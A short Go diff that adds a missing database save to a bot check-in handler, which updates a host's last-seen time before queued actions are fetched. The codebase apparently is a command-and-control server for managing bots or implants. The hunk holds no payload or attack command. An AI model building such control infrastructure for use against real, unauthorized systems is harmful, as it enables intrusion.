@@ -229,7 +229,7 @@ func botCheckinUtil(prot *mcs.MCS) (int32, []*mcs.Action) {
 	if err != nil {
 		return 400, actList // bot assoc w/ unknown host
 	}
-	hostObj.Update().SetLastSeen(checkTime)
+	hostObj.Update().SetLastSeen(checkTime).Save(ctx)
 	acts, err := hostObj.QueryActions().Where(action.Queued(false)).All(ctx)
 	if err != nil {
 		errLog.Printf("Error querying actions: '%s", err.Error())
